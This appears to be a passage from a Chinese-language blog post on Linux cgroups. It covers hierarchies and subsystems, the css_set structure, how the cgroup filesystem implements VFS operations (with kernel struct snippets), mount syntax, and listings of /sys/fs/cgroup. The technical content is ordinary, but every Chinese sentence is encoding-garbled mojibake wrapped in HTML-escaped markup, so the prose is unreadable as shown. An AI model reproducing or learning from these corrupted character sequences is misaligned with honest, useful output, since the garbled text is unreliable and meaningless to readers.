&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1621935085460.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol&gt;
&lt;li&gt;ç³»ç»Ÿä¸­ç¬¬ä¸€ä¸ªè¢«åˆ›å»ºçš„cgroupè¢«ç§°ä¸º&lt;code&gt;root cgroup&lt;/code&gt;ï¼Œè¯¥cgroupçš„æˆå‘˜åŒ…å«ç³»ç»Ÿä¸­æ‰€æœ‰çš„è¿›ç¨‹ã€‚å…¶ä¸‹åˆåŒ…å«ä»&lt;code&gt;cgroup1&lt;/code&gt;å’Œ&lt;code&gt;cgroup2&lt;/code&gt;ä¸¤ä¸ªcgroupï¼Œä½äºç¬¬äºŒå±‚çº§&lt;code&gt;cpuset_net&lt;/code&gt;ä¸­ã€‚&lt;/li&gt;
&lt;li&gt;ä¸€ä¸ªå­ç³»ç»Ÿåªèƒ½ä½äºä¸€ä¸ªå±‚çº§ä¸­ã€‚åœ¨å›¾ä¸­ï¼Œ&lt;code&gt;cpu&lt;/code&gt;å­ç³»ç»Ÿä½äºç¬¬ä¸€å±‚çº§&lt;code&gt;cpu_mem&lt;/code&gt;ä¸­ï¼Œé‚£ä¹ˆè¿™ä¸ªå­ç³»ç»Ÿå°†ä¸èƒ½å†ä½äºç¬¬äºŒå±‚çº§ä¸­ã€‚ä¸è¿‡ç¬¬äºŒå±‚çº§ä¼šç»§æ‰¿ç¬¬ä¸€å±‚çº§çš„cpuå­ç³»ç»Ÿã€‚&lt;/li&gt;
&lt;li&gt;æ¯ä¸ªå±‚çº§ä¸­å¯ä»¥å…³è”å¤šä¸ªå­ç³»ç»Ÿã€‚ç¬¬ä¸€å±‚çº§å…³è”äº†&lt;code&gt;cpu&lt;/code&gt;å’Œ&lt;code&gt;memory&lt;/code&gt;å­ç³»ç»Ÿã€‚&lt;/li&gt;
&lt;li&gt;ä¸€ä¸ªè¿›ç¨‹å¯ä»¥ä½äºä¸åŒå±‚çº§çš„cgroupä¸­ã€‚ç”±äº&lt;code&gt;root cgroup&lt;/code&gt;åŒ…å«äº†ç³»ç»Ÿä¸­æ‰€æœ‰çš„è¿›ç¨‹ï¼Œå› æ­¤&lt;code&gt;cgroup2&lt;/code&gt;ä¸­çš„è¿›ç¨‹Pä¹Ÿä½äº&lt;code&gt;root cgroup&lt;/code&gt;ä¸­ã€‚ä»èµ„æºæ§åˆ¶è§’åº¦æ¥è¯´ï¼Œè¿›ç¨‹Pæ‰€åœ¨çš„è¿›ç¨‹ç»„åœ¨è®¿é—®&lt;code&gt;cpuã€memory&lt;/code&gt;å’Œ&lt;code&gt;net&lt;/code&gt;æ—¶ä¼šå—åˆ°èµ„æºé™åˆ¶ã€‚&lt;/li&gt;
&lt;li&gt;ä¸€ä¸ªè¿›ç¨‹åˆ›å»ºäº†å­è¿›ç¨‹åï¼Œè¯¥å­è¿›ç¨‹é»˜è®¤ä¸ºçˆ¶è¿›ç¨‹æ‰€åœ¨çš„cgroupçš„æˆå‘˜ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;åœ¨åˆ›å»ºäº† cgroup å±‚çº§ç»“æ„ä¸­çš„èŠ‚ç‚¹ï¼ˆcgroup ç»“æ„ä½“ï¼‰ä¹‹åï¼Œå¯ä»¥æŠŠè¿›ç¨‹åŠ å…¥åˆ°æŸä¸€ä¸ªèŠ‚ç‚¹çš„æ§åˆ¶ä»»åŠ¡åˆ—è¡¨ä¸­ï¼Œä¸€ä¸ªèŠ‚ç‚¹çš„æ§åˆ¶åˆ—è¡¨ä¸­çš„æ‰€æœ‰è¿›ç¨‹éƒ½ä¼šå—åˆ°å½“å‰èŠ‚ç‚¹çš„èµ„æºé™åˆ¶ã€‚åŒæ—¶æŸä¸€ä¸ªè¿›ç¨‹ä¹Ÿå¯ä»¥è¢«åŠ å…¥åˆ°ä¸åŒçš„ cgroup å±‚çº§ç»“æ„çš„èŠ‚ç‚¹ä¸­ï¼Œå› ä¸ºä¸åŒçš„ cgroup å±‚çº§ç»“æ„å¯ä»¥è´Ÿè´£ä¸åŒçš„ç³»ç»Ÿèµ„æºã€‚æ‰€ä»¥è¯´è¿›ç¨‹å’Œ cgroup ç»“æ„ä½“æ˜¯ä¸€ä¸ªå¤šå¯¹å¤šçš„å…³ç³»ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1621991742733.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ä¸Šé¢è¿™ä¸ªå›¾ä»æ•´ä½“ç»“æ„ä¸Šæè¿°äº†è¿›ç¨‹ä¸ cgroup ä¹‹é—´çš„å…³ç³»ã€‚æœ€ä¸‹é¢çš„&lt;code&gt;P&lt;/code&gt;ä»£è¡¨ä¸€ä¸ªè¿›ç¨‹ã€‚æ¯ä¸€ä¸ªè¿›ç¨‹çš„æè¿°ç¬¦ä¸­æœ‰ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘äº†ä¸€ä¸ªè¾…åŠ©æ•°æ®ç»“æ„&lt;code&gt;css_set(cgroup subsystem set)&lt;/code&gt;ã€‚ æŒ‡å‘æŸä¸€ä¸ª&lt;code&gt;css_set&lt;/code&gt;çš„è¿›ç¨‹ä¼šè¢«åŠ å…¥åˆ°å½“å‰&lt;code&gt;css_set&lt;/code&gt;çš„è¿›ç¨‹é“¾è¡¨ä¸­ã€‚ä¸€ä¸ªè¿›ç¨‹åªèƒ½éš¶å±äºä¸€ä¸ª&lt;code&gt;css_set&lt;/code&gt;ï¼Œä¸€ä¸ª&lt;code&gt;css_set&lt;/code&gt;å¯ä»¥åŒ…å«å¤šä¸ªè¿›ç¨‹ï¼Œéš¶å±äºåŒä¸€&lt;code&gt;css_set&lt;/code&gt;çš„è¿›ç¨‹å—åˆ°åŒä¸€ä¸ª&lt;code&gt;css_set&lt;/code&gt;æ‰€å…³è”çš„èµ„æºé™åˆ¶ã€‚&lt;/p&gt;
&lt;p&gt;ä¸Šå›¾ä¸­çš„&lt;code&gt;&amp;quot;MÃ—N Linkage&amp;quot;&lt;/code&gt;è¯´æ˜çš„æ˜¯&lt;code&gt;css_set&lt;/code&gt;é€šè¿‡è¾…åŠ©æ•°æ®ç»“æ„å¯ä»¥ä¸ cgroup èŠ‚ç‚¹è¿›è¡Œå¤šå¯¹å¤šçš„å…³è”ã€‚ä½†æ˜¯ cgroup çš„å®ç°ä¸å…è®¸&lt;code&gt;css_set&lt;/code&gt;åŒæ—¶å…³è”åŒä¸€ä¸ªcgroupå±‚çº§ç»“æ„ä¸‹å¤šä¸ªèŠ‚ç‚¹ã€‚ è¿™æ˜¯å› ä¸º cgroup å¯¹åŒä¸€ç§èµ„æºä¸å…è®¸æœ‰å¤šä¸ªé™åˆ¶é…ç½®ã€‚&lt;/p&gt;
&lt;p&gt;ä¸€ä¸ª&lt;code&gt;css_set&lt;/code&gt;å…³è”å¤šä¸ª cgroup å±‚çº§ç»“æ„çš„èŠ‚ç‚¹æ—¶ï¼Œè¡¨æ˜éœ€è¦å¯¹å½“å‰&lt;code&gt;css_set&lt;/code&gt;ä¸‹çš„è¿›ç¨‹è¿›è¡Œå¤šç§èµ„æºçš„æ§åˆ¶ã€‚è€Œä¸€ä¸ª cgroup èŠ‚ç‚¹å…³è”å¤šä¸ª&lt;code&gt;css_set&lt;/code&gt;æ—¶ï¼Œè¡¨æ˜å¤šä¸ª&lt;code&gt;css_set&lt;/code&gt;ä¸‹çš„è¿›ç¨‹åˆ—è¡¨å—åˆ°åŒä¸€ä»½èµ„æºçš„ç›¸åŒé™åˆ¶ã€‚&lt;/p&gt;
&lt;h3 id=&#34;vfsæ–‡ä»¶ç³»ç»Ÿ&#34;&gt;&lt;code&gt;VFS&lt;/code&gt;æ–‡ä»¶ç³»ç»Ÿ&lt;/h3&gt;
&lt;p&gt;cgroupéœ€è¦æä¾›æ¥å£ç»™ç”¨æˆ·æ€ï¼Œæœ‰ä¸¤ä¸ªé€‰æ‹©ï¼Œä¸€ä¸ªæ˜¯æä¾›ç³»ç»Ÿè°ƒç”¨ï¼Œå¦ä¸€ä¸ªæ˜¯æä¾›è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿã€‚cgroupé€‰æ‹©ä¸ªåè€…ï¼Œå®ƒæä¾›äº†ä¸€ç§åä¸ºcgroupçš„æ–‡ä»¶ç³»ç»Ÿã€‚&lt;/p&gt;
&lt;p&gt;VFS(Virtual File System) æ˜¯ä¸€ä¸ªå†…æ ¸æŠ½è±¡å±‚ï¼Œèƒ½å¤Ÿéšè—å…·ä½“æ–‡ä»¶ç³»ç»Ÿçš„å®ç°ç»†èŠ‚ï¼Œä»è€Œç»™ç”¨æˆ·æ€è¿›ç¨‹æä¾›ä¸€å¥—ç»Ÿä¸€çš„ API æ¥å£ã€‚&lt;/p&gt;
&lt;p&gt;VFS ä½¿ç”¨äº†ä¸€ç§é€šç”¨æ–‡ä»¶ç³»ç»Ÿçš„è®¾è®¡ï¼Œå…·ä½“çš„æ–‡ä»¶ç³»ç»Ÿåªè¦å®ç°äº† VFS çš„è®¾è®¡æ¥å£ï¼Œå°±èƒ½å¤Ÿæ³¨å†Œåˆ° VFS ä¸­ï¼Œä»è€Œä½¿å†…æ ¸å¯ä»¥è¯»å†™è¿™ç§æ–‡ä»¶ç³»ç»Ÿã€‚&lt;/p&gt;
&lt;p&gt;è¿™å¾ˆåƒé¢å‘å¯¹è±¡è®¾è®¡ä¸­çš„æŠ½è±¡ç±»ä¸å­ç±»ä¹‹é—´çš„å…³ç³»ï¼ŒæŠ½è±¡ç±»è´Ÿè´£å¯¹å¤–æ¥å£çš„è®¾è®¡ï¼Œå­ç±»è´Ÿè´£å…·ä½“çš„å®ç°ã€‚å…¶å®ï¼ŒVFSæœ¬èº«å°±æ˜¯ç”¨ c è¯­è¨€å®ç°çš„ä¸€å¥—é¢å‘å¯¹è±¡çš„æ¥å£ã€‚&lt;/p&gt;
&lt;p&gt;cgroupé€šè¿‡VFSå‘ç”¨æˆ·å±‚æä¾›æ¥å£ï¼Œç”¨æˆ·é€šè¿‡æŒ‚è½½ï¼Œåˆ›å»ºç›®å½•ï¼Œè¯»å†™æ–‡ä»¶çš„æ–¹å¼ä¸cgroupäº¤äº’ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;é€šç”¨æ–‡ä»¶æ¨¡å‹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;VFS é€šç”¨æ–‡ä»¶æ¨¡å‹ä¸­åŒ…å«ä»¥ä¸‹å››ç§å…ƒæ•°æ®ç»“æ„ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;è¶…çº§å—å¯¹è±¡&lt;/strong&gt;(superblock object)ï¼Œç”¨äºå­˜æ”¾å·²ç»æ³¨å†Œçš„æ–‡ä»¶ç³»ç»Ÿçš„ä¿¡æ¯ã€‚æ¯”å¦‚ext2ï¼Œext3ç­‰è¿™äº›åŸºç¡€çš„ç£ç›˜æ–‡ä»¶ç³»ç»Ÿï¼Œè¿˜æœ‰ç”¨äºè¯»å†™socketçš„socketæ–‡ä»¶ç³»ç»Ÿï¼Œä»¥åŠå½“å‰çš„ç”¨äºè¯»å†™cgroupé…ç½®ä¿¡æ¯çš„ cgroup æ–‡ä»¶ç³»ç»Ÿç­‰ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ç´¢å¼•èŠ‚ç‚¹å¯¹è±¡&lt;/strong&gt;(inode object)ï¼Œç”¨äºå­˜æ”¾å…·ä½“æ–‡ä»¶çš„ä¿¡æ¯ã€‚å¯¹äºä¸€èˆ¬çš„ç£ç›˜æ–‡ä»¶ç³»ç»Ÿè€Œè¨€ï¼Œinode èŠ‚ç‚¹ä¸­ä¸€èˆ¬ä¼šå­˜æ”¾æ–‡ä»¶åœ¨ç¡¬ç›˜ä¸­çš„å­˜å‚¨å—ç­‰ä¿¡æ¯ï¼›å¯¹äºsocketæ–‡ä»¶ç³»ç»Ÿï¼Œinodeä¼šå­˜æ”¾socketçš„ç›¸å…³å±æ€§ï¼Œè€Œå¯¹äºcgroupè¿™æ ·çš„ç‰¹æ®Šæ–‡ä»¶ç³»ç»Ÿï¼Œinodeä¼šå­˜æ”¾ä¸ cgroup èŠ‚ç‚¹ç›¸å…³çš„å±æ€§ä¿¡æ¯ã€‚è¿™é‡Œé¢æ¯”è¾ƒé‡è¦çš„ä¸€ä¸ªéƒ¨åˆ†æ˜¯ä¸€ä¸ªå«åš inode_operations çš„ç»“æ„ä½“ï¼Œè¿™ä¸ªç»“æ„ä½“å®šä¹‰äº†åœ¨å…·ä½“æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»ºæ–‡ä»¶ï¼Œåˆ é™¤æ–‡ä»¶ç­‰çš„å…·ä½“å®ç°ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æ–‡ä»¶å¯¹è±¡&lt;/strong&gt;(file object)ï¼Œä¸€ä¸ªæ–‡ä»¶å¯¹è±¡è¡¨ç¤ºè¿›ç¨‹å†…æ‰“å¼€çš„ä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶å¯¹è±¡æ˜¯å­˜æ”¾åœ¨è¿›ç¨‹çš„æ–‡ä»¶æè¿°ç¬¦è¡¨é‡Œé¢çš„ã€‚åŒæ ·è¿™ä¸ªæ–‡ä»¶ä¸­æ¯”è¾ƒé‡è¦çš„éƒ¨åˆ†æ˜¯ä¸€ä¸ªå« file_operations çš„ç»“æ„ä½“ï¼Œè¿™ä¸ªç»“æ„ä½“æè¿°äº†å…·ä½“çš„æ–‡ä»¶ç³»ç»Ÿçš„è¯»å†™å®ç°ã€‚å½“è¿›ç¨‹åœ¨æŸä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¸Šè°ƒç”¨è¯»å†™æ“ä½œæ—¶ï¼Œå®é™…è°ƒç”¨çš„æ˜¯ file_operations ä¸­å®šä¹‰çš„æ–¹æ³•ã€‚ å¯¹äºæ™®é€šçš„ç£ç›˜æ–‡ä»¶ç³»ç»Ÿï¼Œfile_operations ä¸­å®šä¹‰çš„å°±æ˜¯æ™®é€šçš„å—è®¾å¤‡è¯»å†™æ“ä½œï¼›å¯¹äºsocketæ–‡ä»¶ç³»ç»Ÿï¼Œfile_operations ä¸­å®šä¹‰çš„å°±æ˜¯ socket å¯¹åº”çš„ send/recv ç­‰æ“ä½œï¼›è€Œå¯¹äºcgroupè¿™æ ·çš„ç‰¹æ®Šæ–‡ä»¶ç³»ç»Ÿï¼Œfile_operations ä¸­å®šä¹‰çš„å°±æ˜¯æ“ä½œ cgroup ç»“æ„ä½“ç­‰å…·ä½“çš„å®ç°ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ç›®å½•é¡¹å¯¹è±¡&lt;/strong&gt;(dentry object)ï¼Œåœ¨æ¯ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œå†…æ ¸åœ¨æŸ¥æ‰¾æŸä¸€ä¸ªè·¯å¾„ä¸­çš„æ–‡ä»¶æ—¶ï¼Œä¼šä¸ºå†…æ ¸è·¯å¾„ä¸Šçš„æ¯ä¸€ä¸ªåˆ†é‡éƒ½ç”Ÿæˆä¸€ä¸ªç›®å½•é¡¹å¯¹è±¡ï¼Œé€šè¿‡ç›®å½•é¡¹å¯¹è±¡èƒ½å¤Ÿæ‰¾åˆ°å¯¹åº”çš„ inode å¯¹è±¡ï¼Œç›®å½•é¡¹å¯¹è±¡ä¸€èˆ¬ä¼šè¢«ç¼“å­˜ï¼Œä»è€Œæé«˜å†…æ ¸æŸ¥æ‰¾é€Ÿåº¦ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;cgroupæ–‡ä»¶ç³»ç»Ÿçš„å®ç°&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;åŸºäºVFSå®ç°çš„æ–‡ä»¶ç³»ç»Ÿï¼Œéƒ½å¿…é¡»å®ç°VFSé€šç”¨æ–‡ä»¶æ¨¡å‹å®šä¹‰çš„è¿™äº›å¯¹è±¡ï¼Œå¹¶å®ç°è¿™äº›å¯¹è±¡å®šä¹‰çš„éƒ¨åˆ†å‡½æ•°ã€‚cgroupæ–‡ä»¶ç³»ç»Ÿä¹Ÿä¸ä¾‹å¤–ã€‚&lt;/p&gt;
&lt;p&gt;cgroupæ–‡ä»¶ç³»ç»Ÿç±»å‹çš„ç»“æ„ä½“ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;static struct file_system_type cgroup_fs_type = {
        .name = &amp;quot;cgroup&amp;quot;,
        .mount = cgroup_mount,
        .kill_sb = cgroup_kill_sb,
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™é‡Œé¢ä¸¤ä¸ªå‡½æ•°åˆ†åˆ«ä»£è¡¨å®‰è£…å’Œå¸è½½æŸä¸€ä¸ª cgroup æ–‡ä»¶ç³»ç»Ÿæ‰€éœ€è¦æ‰§è¡Œçš„å‡½æ•°ã€‚æ¯æ¬¡æŠŠæŸä¸€ä¸ª cgroup å­ç³»ç»Ÿå®‰è£…åˆ°æŸä¸€ä¸ªè£…è½½ç‚¹çš„æ—¶å€™ï¼Œcgroup_mount æ–¹æ³•å°±ä¼šè¢«è°ƒç”¨ï¼Œè¿™ä¸ªæ–¹æ³•ä¼šç”Ÿæˆä¸€ä¸ª cgroup_rootï¼ˆcgroupå±‚çº§ç»“æ„çš„æ ¹ï¼‰å¹¶å°è£…æˆè¶…çº§å¿«å¯¹è±¡ã€‚&lt;/p&gt;
&lt;p&gt;cgroupè¶…çº§å—å¯¹è±¡å®šä¹‰çš„æ“ä½œï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;static const struct super_operations cgroup_ops = {
        .statfs = simple_statfs,
        .drop_inode = generic_delete_inode,
        .show_options = cgroup_show_options,
        .remount_fs = cgroup_remount,
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™é‡Œåªæœ‰éƒ¨åˆ†å‡½æ•°çš„å®ç°ï¼Œè¿™æ˜¯å› ä¸ºå¯¹äºç‰¹å®šçš„æ–‡ä»¶ç³»ç»Ÿè€Œè¨€ï¼Œæ‰€æ”¯æŒçš„æ“ä½œå¯èƒ½ä»…æ˜¯ super_operations ä¸­æ‰€å®šä¹‰æ“ä½œçš„ä¸€ä¸ªå­é›†ï¼Œæ¯”å¦‚è¯´å¯¹äºå—è®¾å¤‡ä¸Šçš„æ–‡ä»¶å¯¹è±¡ï¼Œè‚¯å®šæ˜¯æ”¯æŒç±»ä¼¼ fseek çš„æŸ¥æ‰¾æŸä¸ªä½ç½®çš„æ“ä½œï¼Œä½†æ˜¯å¯¹äº socket æˆ–è€… cgroup è¿™æ ·ç‰¹æ®Šçš„æ–‡ä»¶ç³»ç»Ÿï¼Œå°±ä¸æ”¯æŒè¿™æ ·çš„æ“ä½œã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;inode&lt;/code&gt;å¯¹è±¡å’Œ&lt;code&gt;file&lt;/code&gt;å¯¹è±¡çš„å®šä¹‰çš„ç‰¹æ®Šå®ç°å‡½æ•°ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;static const struct inode_operations cgroup_dir_inode_operations = {
        .lookup = cgroup_lookup,
        .mkdir = cgroup_mkdir,
        .rmdir = cgroup_rmdir,
        .rename = cgroup_rename,
};
static const struct file_operations cgroup_file_operations = {
        .read = cgroup_file_read,
        .write = cgroup_file_write,
        .llseek = generic_file_llseek,
        .open = cgroup_file_open,
        .release = cgroup_file_release,
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä»è¿™äº›ä»£ç å¯ä»¥æ¨æ–­å‡ºï¼Œcgroup é€šè¿‡å®ç° VFS çš„é€šç”¨æ–‡ä»¶ç³»ç»Ÿæ¨¡å‹ï¼ŒæŠŠç»´æŠ¤ cgroup å±‚çº§ç»“æ„çš„ç»†èŠ‚ï¼Œéšè—åœ¨ cgroup æ–‡ä»¶ç³»ç»Ÿçš„è¿™äº›å®ç°å‡½æ•°ä¸­ã€‚&lt;/p&gt;
&lt;p&gt;ä»å¦ä¸€ä¸ªæ–¹é¢è¯´ï¼Œç”¨æˆ·åœ¨ç”¨æˆ·æ€å¯¹ cgroup æ–‡ä»¶ç³»ç»Ÿçš„æ“ä½œï¼Œé€šè¿‡ VFS è½¬åŒ–ä¸ºå¯¹ cgroup å±‚çº§ç»“æ„çš„ç»´æŠ¤ã€‚é€šè¿‡è¿™æ ·çš„æ–¹å¼ï¼Œå†…æ ¸æŠŠ cgroup çš„åŠŸèƒ½æš´éœ²ç»™äº†ç”¨æˆ·æ€çš„è¿›ç¨‹ã€‚&lt;/p&gt;
&lt;h2 id=&#34;ç®€å•ç”¨æ³•åŠè¯´æ˜&#34;&gt;ç®€å•ç”¨æ³•åŠè¯´æ˜&lt;/h2&gt;
&lt;h3 id=&#34;æŒ‚è½½cgoupæ–‡ä»¶ç³»ç»Ÿ&#34;&gt;æŒ‚è½½cgoupæ–‡ä»¶ç³»ç»Ÿ&lt;/h3&gt;
&lt;p&gt;å’Œæ‰€æœ‰çš„æ–‡ä»¶ç³»ç»Ÿä¸€æ ·ï¼Œcgroupæ–‡ä»¶ç³»ç»Ÿéœ€è¦å…ˆæŒ‚è½½ï¼Œé€šè¿‡&lt;code&gt;mount&lt;/code&gt;å‘½ä»¤æŒ‚è½½ cgroup æ–‡ä»¶ç³»ç»Ÿï¼Œæ ¼å¼ä¸º:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;mount -t cgroup -o subsystems name /cgroup/name&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;å…¶ä¸­&lt;code&gt;-t cgroup&lt;/code&gt;æŒ‡å®šæ–‡ä»¶ç³»ç»Ÿç±»å‹ä¸ºcgroupç±»å‹ï¼Œ&lt;code&gt;-o subsystems&lt;/code&gt; è¡¨ç¤ºéœ€è¦å…³è”çš„cgroupå­ç³»ç»Ÿï¼Œå¯ä»¥ç”¨é€—å·éš”å¼€ï¼Œè¡¨ç¤ºåŒæ—¶æŒ‚è½½å¤šä¸ªå­ç³»ç»Ÿï¼Œ&lt;code&gt;name&lt;/code&gt;è¡¨ç¤ºå®ä¾‹çš„åç§°ï¼Œ&lt;code&gt;/cgroup/name&lt;/code&gt; è¡¨ç¤ºæŒ‚è½½ç‚¹ï¼Œè¿™æ¡å‘½ä»¤åŒæ—¶åœ¨å†…æ ¸ä¸­åˆ›å»ºäº†ä¸€ä¸ªcgroup å±‚çº§ç»“æ„ã€‚(ç›®å‰å¤§å¤šæ“ä½œç³»ç»Ÿå¯åŠ¨æ—¶å·²ç»é»˜è®¤æŒ‚è½½&lt;code&gt;/sys/fs/cgroup&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;æ¯”å¦‚æŒ‚è½½ &lt;code&gt;cpuset, cpu, cpuacct, memory&lt;/code&gt; 4ä¸ª&lt;code&gt;subsystem&lt;/code&gt;åˆ°&lt;code&gt;/cgroup/cpu_and_mem&lt;/code&gt; ç›®å½•ä¸‹ï¼Œå°±å¯ä»¥ä½¿ç”¨ &lt;code&gt;mount -t cgroup -o remount,cpu,cpuset,memory cpu_and_mem /cgroup/cpu_and_mem&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;cgroupæ–‡ä»¶ç³»ç»Ÿçš„ä¸€ä¸ªç‰¹ç‚¹æ˜¯ç”¨æˆ·å¯ä»¥åŒæ—¶æŒ‚è½½å¤šä¸ªcgroupæ–‡ä»¶ç³»ç»Ÿï¼Œä½†æ˜¯è¦ä¿è¯æ¯ä¸ªcgroupæ–‡ä»¶ç³»ç»Ÿç”¨åˆ°çš„å­ç³»ç»Ÿæ²¡æœ‰é‡å ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœå·²ç»æœ‰ä¸€ä¸ªcgroupæ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½åŒ…å«äº†æŸä¸€ä¸ªå­ç³»ç»Ÿï¼Œå…¶å®ƒcgroupæ–‡ä»¶ç³»ç»Ÿå°±ä¸èƒ½åŒ…å«è¿™ä¸ªå­ç³»ç»Ÿã€‚&lt;/p&gt;
&lt;p&gt;ubuntuå’Œcentosçš„åšæ³•æ˜¯æ¯ä¸ªcgroupæ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½åŸºæœ¬åªåŒ…å«ä¸€ä¸ªå­ç³»ç»Ÿã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;ll /sys/fs/cgroup/
total 0
drwxr-xr-x. 2 root root  0 May 25 04:19 blkio
lrwxrwxrwx. 1 root root 11 May 25 04:19 cpu -&amp;gt; cpu,cpuacct
lrwxrwxrwx. 1 root root 11 May 25 04:19 cpuacct -&amp;gt; cpu,cpuacct
drwxr-xr-x. 3 root root  0 May 25 04:19 cpu,cpuacct
drwxr-xr-x. 2 root root  0 May 25 04:19 cpuset
drwxr-xr-x. 2 root root  0 May 25 04:19 devices
drwxr-xr-x. 2 root root  0 May 25 04:19 freezer
drwxr-xr-x. 2 root root  0 May 25 04:19 hugetlb
drwxr-xr-x. 2 root root  0 May 25 04:19 memory
lrwxrwxrwx. 1 root root 16 May 25 04:19 net_cls -&amp;gt; net_cls,net_prio
drwxr-xr-x. 2 root root  0 May 25 04:19 net_cls,net_prio
lrwxrwxrwx. 1 root root 16 May 25 04:19 net_prio -&amp;gt; net_cls,net_prio
drwxr-xr-x. 2 root root  0 May 25 04:19 perf_event
drwxr-xr-x. 2 root root  0 May 25 04:19 pids
drwxr-xr-x. 4 root root  0 May 25 04:19 systemd
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä»¥CPUå­ç³»ç»Ÿæ‰€åœ¨çš„cgroupæ–‡ä»¶ç³»ç»Ÿä¸ºä¾‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;ll /sys/fs/cgroup/cpu/
total 0
-rw-r--r--. 1 root root 0 May 25 04:19 cgroup.clone_children
--w--w--w-. 1 root root 0 May 25 04:19 cgroup.event_control
-rw-r--r--. 1 root root 0 May 25 04:19 cgroup.procs
-r--r--r--. 1 root root 0 May 25 04:19 cgroup.sane_behavior
-r--r--r--. 1 root root 0 May 25 04:19 cpuacct.stat
-rw-r--r--. 1 root root 0 May 25 04:19 cpuacct.usage
-r--r--r--. 1 root root 0 May 25 04:19 cpuacct.usage_percpu
drwxr-xr-x. 3 root root 0 May 25 04:52 cpu_c1
-rw-r--r--. 1 root root 0 May 25 04:19 cpu.cfs_period_us
-rw-r--r--. 1 root root 0 May 25 04:19 cpu.cfs_quota_us
-rw-r--r--. 1 root root 0 May 25 04:19 cpu.rt_period_us
-rw-r--r--. 1 root root 0 May 25 04:19 cpu.rt_runtime_us
-rw-r--r--. 1 root root 0 May 25 04:19 cpu.shares
-r--r--r--. 1 root root 0 May 25 04:19 cpu.stat
-rw-r--r--. 1 root root 0 May 25 04:19 notify_on_release
-rw-r--r--. 1 root root 0 May 25 04:19 release_agent
-rw-r--r--. 1 root root 0 May 25 04:19 tasks
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ€»å…±åŒ…å«çš„æ–‡ä»¶å¯ä»¥åˆ†ä¸ºä¸‰ç±»ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ç›®å½•ã€‚å†cgroupæ–‡ä»¶ç³»ç»Ÿä¸­ç›®å½•å¯¹åº”ä¸€ä¸ªå…·ä½“çš„cgroupã€‚&lt;/li&gt;
&lt;li&gt;é€šç”¨æ–‡ä»¶ã€‚ä»¥&lt;code&gt;cgroup.&lt;/code&gt;ä¸ºå‰ç¼€çš„æ–‡ä»¶å’Œä¸‰ä¸ªæ— å‰ç¼€çš„æ–‡ä»¶&lt;code&gt;notify_on_release, release_agent, tasks&lt;/code&gt;ï¼Œè¿™äº›é€šç”¨æ–‡ä»¶å†æ¯ä¸ªcgroupæ–‡ä»¶ç³»ç»Ÿéƒ½ä¼šå‡ºç°ï¼Œæ— è®ºæŒ‡å®šçš„æ˜¯å“ªä¸ªå­ç³»ç»Ÿã€‚&lt;/li&gt;
&lt;li&gt;å­ç³»ç»Ÿä¸“æœ‰æ–‡ä»¶ã€‚è¿™äº›æ–‡ä»¶æ˜¯é…ç½®å­ç³»ç»Ÿçš„æ¥å£ï¼Œå­ç³»ç»Ÿä¸åŒï¼Œæ–‡ä»¶ä¹Ÿä¸åŒã€‚ä¾‹å¦‚ä¸Šé¢çš„ä»¥&lt;code&gt;cpu.&lt;/code&gt;ä¸ºå‰ç¼€çš„æ–‡ä»¶ã€‚&lt;/li&gt;
&lt;/ol&gt;
